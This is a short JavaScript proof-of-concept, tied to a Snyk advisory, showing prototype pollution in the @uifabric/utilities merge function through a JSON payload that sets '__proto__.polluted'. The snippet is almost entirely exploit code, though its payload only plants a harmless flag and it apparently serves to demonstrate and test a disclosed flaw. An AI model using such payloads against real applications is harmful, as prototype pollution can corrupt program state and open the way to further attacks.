//https://snyk.io/vuln/SNYK-JS-UIFABRICUTILITIES-571487
 
  const util = require("@uifabric/utilities");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  const source2 = {
    k3: {},
  };

   

  y = util.merge(source2, JSON.parse(malicious_payload));
// End of file
